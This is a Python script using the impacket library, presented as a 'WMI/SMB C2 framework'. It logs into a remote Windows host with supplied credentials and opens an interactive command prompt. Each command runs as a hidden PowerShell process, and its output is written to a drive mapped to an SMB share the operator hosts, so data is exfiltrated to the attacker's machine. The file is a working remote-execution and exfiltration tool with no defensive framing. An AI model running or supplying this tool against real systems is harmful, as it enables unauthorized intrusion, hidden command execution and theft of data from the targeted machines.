import argparse
import os
import time
import sys
import subprocess
from datetime import datetime
from impacket.examples import logger
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket import version

# SMB share configuration for exfiltration
SHARE_NAME = 'dropzone'
SHARE_USER = 'dropuser'
SHARE_PASS = 'hunter2'
SHARE_FOLDER = '/tmp/dropzone'

def launch_smb_share():
    """
    Launch an authenticated SMB server for output collection.
    """
    if not os.path.exists(SHARE_FOLDER):
        os.makedirs(SHARE_FOLDER)
    command = [
        'impacket-smbserver', SHARE_NAME, SHARE_FOLDER,
        '-smb2support',
        '-username', SHARE_USER,
        '-password', SHARE_PASS
    ]
    return subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def gen_filename():
    """
    Generate a timestamped output filename.
    """
    return f'result_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'

def run_remote_cmd(service, cmd, host_ip):
    """
    Execute a command on the remote machine and retrieve the output via SMB.
    """
    try:
        fname = gen_filename()
        unc_path = f'Z:\\{fname}'
        local_path = os.path.join(SHARE_FOLDER, fname)
        smb_path = f'\\\\{host_ip}\\{SHARE_NAME}'

        process, _ = service.GetObject('Win32_Process')

        # Mount Z: to our SMB share using PowerShell
        net_use = f'powershell.exe -WindowStyle Hidden -Command "net use Z: {smb_path} /user:{SHARE_USER} {SHARE_PASS}"'
        process.Create(net_use, 'C:\\', None)
        time.sleep(2)

        # Execute command and write output to Z:
        ps_exec = f'powershell.exe -WindowStyle Hidden -Command "{cmd} > {unc_path} 2>&1"'
        result = process.Create(ps_exec, 'C:\\', None)
        pid = result.getProperties()['ProcessId']['value']
        print(f"[+] Command dispatched. Remote PID: {pid}")
        print(f"[+] Awaiting output at: {local_path}")

        for _ in range(10):
            time.sleep(2)
            if os.path.exists(local_path):
                with open(local_path, 'rb') as f:
                    raw = f.read()
                try:
                    print("\n" + raw.decode('utf-16'))
                except UnicodeDecodeError:
                    print("\n" + raw.decode('utf-8', errors='ignore'))
                break
        else:
            print("[-] Output not received.")

        # Unmount drive to clean up
        unmount = 'powershell.exe -WindowStyle Hidden -Command "net use Z: /delete /y"'
        process.Create(unmount, 'C:\\', None)

    except Exception as err:
        print(f"[-] Command execution failed: {err}")

def operator_loop(service, lhost):
    """
    Main loop to receive operator commands.
    """
    print("\n[+] Connected to remote host. Type 'exit' to quit.\n")
    while True:
        try:
            user_cmd = input("wmi-c2> ").strip()
            if user_cmd.lower() in ['exit', 'quit']:
                print("[*] Session ended.")
                break
            if user_cmd:
                run_remote_cmd(service, user_cmd, lhost)
        except KeyboardInterrupt:
            print("\n[*] Interrupted. Closing session.")
            break

def connect_and_run(host, user, passwd, domain, lhost):
    """
    Set up DCOM/WMI connection and launch C2 loop.
    """
    try:
        logger.init()
        print(version.BANNER)

        print(f"[+] Initializing SMB server on {lhost}...")
        smb_proc = launch_smb_share()
        time.sleep(2)

        dcom = DCOMConnection(host, user, passwd, domain, '', '', doKerberos=False)
        interface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
        login_obj = wmi.IWbemLevel1Login(interface)
        service = login_obj.NTLMLogin('//./root/cimv2', NULL, NULL)
        login_obj.RemRelease()

        print(f"[+] DCOM/WMI session established with {host}")
        operator_loop(service, lhost)

        dcom.disconnect()
        smb_proc.terminate()
        print("[*] SMB server terminated.")

    except Exception as ex:
        print(f"[-] Connection error: {ex}")
        sys.exit(1)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Lightweight WMI/SMB C2 Framework')
    parser.add_argument('target', help='Target IP')
    parser.add_argument('username', help='WMI-capable user')
    parser.add_argument('password', help='User password')
    parser.add_argument('--domain', default='', help='Domain name or leave blank')
    parser.add_argument('--lhost', help='Local IP for SMB callback')

    args = parser.parse_args()

    if not args.lhost:
        args.lhost = input("[?] Enter LHOST (your IP): ").strip()

    connect_and_run(args.target, args.username, args.password, args.domain, args.lhost)